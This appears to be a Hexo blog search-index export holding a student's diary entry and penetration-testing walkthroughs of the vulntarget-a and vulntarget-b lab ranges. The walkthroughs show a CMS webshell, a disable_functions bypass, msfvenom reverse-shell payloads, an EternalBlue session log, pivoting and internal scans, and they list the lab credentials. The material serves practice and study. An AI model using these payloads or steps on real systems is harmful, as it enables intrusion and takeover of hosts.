<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>杂</title>
    <url>/posts/9577635b/</url>
    <content><![CDATA[<ul>
<li>2022.1.17</li>
</ul>
<p>9月开始就一直没在更新博客，只把一些学习笔记放在本地了。最近年底了，在公司没(摸)事（🐟）干，就总结下在这边实习学到的些东西、本来打算用wordpress去搭建，搭好之后发现太麻烦了，还是hexo简单，而且之前的东西也不用迁移。之前一直托管到github上，但是有些图片无法成功解析出来，所以就准备放在云主机上，最近这几天就开始把本地的一些东西整理一下放到博客上..o(<em>￣▽￣</em>)ブ  待完成的等有时间就整理上去</p>
<ul>
<li>2022.2.21</li>
</ul>
<p>距离上次更新已经一个多月了，中间隔离了一周，然后就是过年就一直摆了…这段时间在学恶意样本分析，刚看完微尘网络的C++反汇编，不过到后面的windowsAPI那块基本上只跟了视频，没有跟着敲代码。</p>
<p>近期计划先把之前没完善完的东西再整理下，顺便回顾一下，然后再准备春招和毕设了…然后再看一下这一两个月爆出的洞，然后再在微步上找几个样本在练下手（由于4月初要回学校呆一段时间，所以就没找实习，一个多月的实习，，，时间上有点尴尬… 计划再毕业正式工作前和朋友去一趟旅行~）如果有时间就去学一下滴水三期课程QAQ  加油咯！ </p>
<ul>
<li>2022.3.5</li>
</ul>
<p>最近再准备春招 刚笔试了qax 。刷了 3、4 天的牛客题目，编程题一道不会 白给… 选择不定项感觉还好，不过想都不用想 定是凉凉。说实话我挺不喜欢算法的，从大学以来就对acm这些算法不感兴趣然后选择了打CTF，接触网络安全的，记着之前秋招的时候也投过几家，同样都要考算法QAQ，然后日常白给，这次也寄了（ 本来就挺菜的，我更想倾向于把时间去学习漏洞复现 免杀 样本分析这些东西 或者去有机会去刷一下滴水，感觉去刷算法对我目前来说 真的没啥意思 就算是刷了好多题 感觉对我后续网安路上也没啥太大用途…） </p>
<p>后续可能考虑找个实习啥的，如果时间上允许的话，但是HvV估计时间上和毕业冲突 又去不成了.去年本能去成，结果学院原因没法去😔</p>
<p>春招都考算法 我还是想考虑走社招了(太菜了刷不动算法，而且毫无兴趣)，近期就学下样本分析，复现下最近爆出的几个洞，看看文章，学学免杀，准备毕业论文了。</p>
<ul>
<li>2022.3.21</li>
</ul>
<p>近期附近爆发疫情了，刚来这边半个月还有好多地方没去打卡😔，周末两天也算是相对充实吧，本想出去爬个山结果晚上风太大了……就往返了。周末在家又宅了两天，看看书，学学习，打几把dota，然后每天锻炼一小时，做做瑜伽，再去做几顿减脂餐，虽然有点无聊，但是还比较充实。最近由于个人原因，也没去在更新东西。周末看了看whale大佬的博客和直播，感觉还是有些感悟的。</p>
<p>平日里还要多多锻炼，一年至少读3本书，经常锻炼、瑜伽……</p>
<p>这半年目标的话就是 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">减到150，</span><br><span class="line"></span><br><span class="line">读完一本书并及时记录心得，</span><br><span class="line"></span><br><span class="line">打完vulntarget靶场，</span><br><span class="line"></span><br><span class="line">每天坚持锻炼(每日早晚瑜伽，晚上锻炼)</span><br><span class="line"></span><br><span class="line">调好作息</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果有时间的话，再把博客好好整理一下，然后迁移到服务器上，github上会有一些图片无法成功解析…</p>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-b靶机</title>
    <url>/posts/f33996e/</url>
    <content><![CDATA[<br>

<h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><br>

<p><img src="/posts/f33996e/1.png" alt="1.png"></p>
<br>

<br>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="外网机器-centos7"><a href="#外网机器-centos7" class="headerlink" title="外网机器 centos7"></a>外网机器 centos7</h4><p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
<p><img src="/posts/f33996e/2.png" alt="截图"></p>
<br>

<p><code>systemctl restart networl</code></p>
<p><code>ifconfig</code>   ip为 <code>10.10.10.134</code></p>
<br>

<br>

<br>

<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sV 10.10.10.134</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 10.10.10.134 -sV</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-23 03:04 EDT</span><br><span class="line">Nmap scan report for 10.10.10.134</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     Pure-FTPd</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http    nginx</span><br><span class="line">81&#x2F;tcp   open  http    nginx</span><br><span class="line">888&#x2F;tcp  open  http    nginx</span><br><span class="line">3306&#x2F;tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888&#x2F;tcp open  http    nginx</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds</span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>

<br>

<p>81端口 极致CMS</p>
<p>8888端口 宝塔</p>
<p>80端口 就一个主页 dirsearch没扫到东西</p>
<p>888端口 403</p>
<br>

<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;10.10.10.134:81&#x2F;</span><br><span class="line"></span><br><span class="line">[03:10:56] Starting:                                                         </span><br><span class="line">[03:11:04] 200 -  479B  - &#x2F;404.html                                         </span><br><span class="line">[03:11:04] 301 -  162B  - &#x2F;A  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;A&#x2F;                 </span><br><span class="line">[03:11:06] 403 -  548B  - &#x2F;Public&#x2F;                                          </span><br><span class="line">[03:11:12] 302 -    0B  - &#x2F;admin.php  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;admin.php&#x2F;Login&#x2F;index.html</span><br><span class="line">[03:11:22] 301 -  162B  - &#x2F;backup  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;backup&#x2F;       </span><br><span class="line">[03:11:22] 403 -  548B  - &#x2F;backup&#x2F;                                          </span><br><span class="line">[03:11:24] 403 -  548B  - &#x2F;cache&#x2F;                                           </span><br><span class="line">[03:11:24] 301 -  162B  - &#x2F;cache  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;cache&#x2F;</span><br><span class="line">[03:11:32] 200 -    4KB - &#x2F;favicon.ico                                      </span><br><span class="line">[03:11:36] 200 -  917B  - &#x2F;index.html                                       </span><br><span class="line">[03:11:37] 200 -    0B  - &#x2F;index.php&#x2F;login&#x2F;                                 </span><br><span class="line">[03:11:37] 200 -   14KB - &#x2F;index.php                                        </span><br><span class="line">[03:11:37] 301 -  162B  - &#x2F;install  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;install&#x2F;     </span><br><span class="line">[03:11:37] 200 -   75B  - &#x2F;install&#x2F;index.php?upgrade&#x2F;                       </span><br><span class="line">[03:11:37] 200 -   75B  - &#x2F;install&#x2F;</span><br><span class="line">[03:11:51] 200 -   22KB - &#x2F;readme.txt                                       </span><br><span class="line">[03:11:51] 200 -  157B  - &#x2F;robots.txt                                       </span><br><span class="line">[03:11:55] 200 -  490B  - &#x2F;sitemap.xml                                      </span><br><span class="line">[03:11:57] 301 -  162B  - &#x2F;static  -&gt;  http:&#x2F;&#x2F;10.10.10.134:81&#x2F;static&#x2F;       </span><br><span class="line">[03:12:02] 200 -  816B  - &#x2F;web.config                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到后台登录点 <code>admin.php</code> 好像除了这个 别的页面都访问不了…</p>
<p>弱口令进入后台… （反正我没试出了/// ） admin/admin123</p>
<p><img src="/posts/f33996e/3.png" alt="截图"></p>
<p>发现当前版本为 v1.8.1 通过wapplyzer看到是 nginx</p>
<br>

<h4 id="文件上传-失败"><a href="#文件上传-失败" class="headerlink" title="文件上传(失败)"></a>文件上传(失败)</h4><p>在系统设置-&gt;基本设置-&gt;允许上传文件类型  添加 php后缀  然后再去找一个上传点</p>
<p>在网站管理处–&gt;轮播图列表</p>
<p>商品管理–&gt;商品列表 </p>
<p><img src="/posts/f33996e/4.png" alt="截图"></p>
<p>然后提示不允许上传 ，用00截断这类的 都被重命名了 最终还是没绕过去</p>
<p>去网上找了下极致CMS1.8.1版本相关漏洞 看到了这么篇文章 <a href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
<p>使用拓展管理插件getshell</p>
<h4 id><a href="#" class="headerlink" title></a></h4><p><img src="/posts/f33996e/5.png" alt="截图"></p>
<p>然后使用这个在线编辑模板</p>
<p><img src="/posts/f33996e/6.png" alt="截图"></p>
<p>然后设置一个密码 这里设置为 123321 提交后进入了代码编辑器</p>
<p><img src="/posts/f33996e/7.png" alt="截图"></p>
<p>然后就可以通过这个编辑器去查看代码 写入一句话</p>
<p>在index.php写一个phpinfo 然后成功生效</p>
<p><img src="/posts/f33996e/8.png" alt="截图"></p>
<p><img src="/posts/f33996e/9.png" alt="截图"></p>
<p>这样写一个一句话 用蚁剑连一下就可以了</p>
<p><img src="/posts/f33996e/10.png" alt="截图"></p>
<p>连上蚁剑之后没法执行命令，看了下phpinfo 禁用了好多函数 之前扫端口的时候扫到了有宝塔，应该是宝塔把函数给禁掉了</p>
<p><img src="/posts/f33996e/11.png" alt="截图"></p>
<br>

<p>尝试下蚁剑绕过disable_function的插件</p>
<p>使用这个<code>php7_GC_UAF</code> 可以成功绕过</p>
<p><img src="/posts/f33996e/12.png" alt="截图"></p>
<p>直接上msf</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.114 lport=3344 -f elf &gt; 3344.elf</code></p>
<p><img src="/posts/f33996e/13.png" alt="截图"></p>
<br>

<p>发现有两个网卡，一个网段为<code>10.10.10.0/24</code> (公网ip为 10.10.10.134)</p>
<p>另一个为 <code>10.0.20.0/24</code> (内网ip为10.0.20.30)</p>
<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code>meterpreter &gt;  run post/multi/manage/autoroute</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: linux)                                                                 </span><br><span class="line">[*] Running module against localhost.localdomain                             </span><br><span class="line">[*] Searching for subnets to autoroute.                                      </span><br><span class="line">[+] Route added to subnet 10.0.20.0&#x2F;255.255.255.0 from host&#39;s routing table. </span><br><span class="line">[+] Route added to subnet 10.10.10.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br></pre></td></tr></table></figure>

<h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/posts/f33996e/14.png" alt="截图">         </p>
<p>(扫了好久没扫到，突然想到机器忘记开了…离谱)</p>
<p>直接挂代理 用proxychains扫</p>
<p><img src="/posts/f33996e/15.png" alt="截图"></p>
<p>刚才用msf的portscan只扫到8080，用nmap扫一下</p>
<p><code>proxychains nmap -sV 10.0.20.66</code> 扫了20分钟</p>
<p><img src="/posts/f33996e/16.png" alt="截图"></p>
<p>又发现了3306端口</p>
<br>

<p>然后使用浏览器挂代理访问 10.0.20.66:8080 是个禅道cms</p>
<p><img src="/posts/f33996e/17.png" alt="截图"></p>
<p>查看源码 发现是 禅道v12.4.2 找下对应漏洞</p>
<p>下班了 早点回去 明天再搞…</p>
<br>

<br>

<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/">https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-a靶机</title>
    <url>/posts/3edb83f3/</url>
    <content><![CDATA[<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ">https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ</a><br><a href="https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht">https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht</a></p>
</blockquote>
<h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img src="/posts/3edb83f3/1.png"></p>
<p>（直接在crow那个拿过来的）</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="域控-2019"><a href="#域控-2019" class="headerlink" title="域控 2019"></a>域控 2019</h4><p>administrator / Admin@666</p>
<p>IP 10.0.10.110</p>
<h4 id="外网机器-win7"><a href="#外网机器-win7" class="headerlink" title="外网机器 win7"></a>外网机器 win7</h4><p>win7 / admin</p>
<p>IP 192.168.0.133 / 10.0.20.98</p>
<h4 id="域内用户-2016"><a href="#域内用户-2016" class="headerlink" title="域内用户 2016"></a>域内用户 2016</h4><p>Administrator / Admin@123</p>
<p>balsec.com\win2016 / Admin#123</p>
<p>IP 10.0.10.111 / 10.0.20.99</p>
<br>

<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>外网机器是一台win7 已知IP为 10.10.10.248</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>先用nmap扫一下 发现就一个80 web端口</p>
<p><img src="/posts/3edb83f3/2.png" alt="截图"></p>
<h4 id="通达OA-Getshell"><a href="#通达OA-Getshell" class="headerlink" title="通达OA Getshell"></a>通达OA Getshell</h4><p>10.10.10.248 主页是一台通达OA 直接使用工具梭哈</p>
<p><img src="/posts/3edb83f3/3.png" alt="截图"></p>
<p>连接蚁剑</p>
<p>执行<code>whoami</code> 直接是system权限</p>
<p><img src="/posts/3edb83f3/4.png" alt="截图"></p>
<p>然后 <code>systeminfo</code> <code>ipconfig /all</code></p>
<p>发现有两张网卡 不在域内</p>
<p><img src="/posts/3edb83f3/5.png" alt="截图"></p>
<br>

<p>这里直接上CS</p>
<p>本想直接从cs 转到msf，一直连不上换payload也不行，就直接上个msf马</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.114 lport=8888 -f exe &gt; shell.exe</code></p>
<br>

<h4 id="ms17-010利用"><a href="#ms17-010利用" class="headerlink" title="ms17-010利用"></a>ms17-010利用</h4><p>这里的win7也存在ms17010漏洞 成功拿到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 </span><br><span class="line">sf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.248</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br><span class="line">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.248</span><br><span class="line">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.114:4444 </span><br><span class="line">[*] 10.10.10.248:445 - Using auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.10.10.248:445 - The target is vulnerable.</span><br><span class="line">[*] 10.10.10.248:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.248:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.248:445 - Target arch selected valid for arch indicated by DCE&#x2F;RPC reply</span><br><span class="line">[*] 10.10.10.248:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.248:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.248:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.248:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.248:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.248:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.248:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.248:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.248:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.248:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.248:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.10.248</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.114:4444 -&gt; 10.10.10.248:50270) at 2022-03-22 02:50:35 -0400</span><br><span class="line">[+] 10.10.10.248:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">[+] 10.10.10.248:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-WIN-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">[+] 10.10.10.248:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7-PC</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64&#x2F;windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Intel(R) PRO&#x2F;1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:05</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.248</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::2de1:362a:d91a:ed60</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Intel(R) PRO&#x2F;1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:0f</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.0.20.98</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::5146:76d1:7288:d8be</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:a0a:af8</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  13</span><br><span class="line">    10.10.10.1       fc:7c:02:73:a5:40  11</span><br><span class="line">    10.10.10.114     34:e1:2d:a3:ac:4b  11</span><br><span class="line">    10.10.10.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.2        00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  11</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  13</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  13</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  13</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到存在两个网卡 另一个网段为 <code>10.0.20.0/24</code></p>
<p>然后去迁移进程 添加路由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;migrate </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Current server process: spoolsv.exe (1140)</span><br><span class="line">[*] Spawning notepad.exe process to migrate into</span><br><span class="line">[*] Spoofing PPID 0</span><br><span class="line">[*] Migrating into 3200</span><br><span class="line">[+] Successfully migrated into process 3200</span><br><span class="line">meterpreter &gt; run post&#x2F;multi&#x2F;manage&#x2F;autoroute </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line">[+] Route added to subnet 10.0.20.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">[+] Route added to subnet 10.10.10.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>route print</code> 查看路由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.0.20.0          255.255.255.0      Session 2</span><br><span class="line">   10.10.10.0         255.255.255.0      Session 2</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后使用msf 端口扫描模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set ports 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">ports &#x3D;&gt; 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set rhosts 10.0.20.0&#x2F;24</span><br><span class="line">rhosts &#x3D;&gt; 10.0.20.0&#x2F;24</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 20</span><br><span class="line">threads &#x3D;&gt; 20</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:3389 - TCP OPEN</span><br><span class="line"></span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned  26 of 256 hosts (10% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned  56 of 256 hosts (21% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned  79 of 256 hosts (30% complete)</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:6379 - TCP OPEN</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 129 of 256 hosts 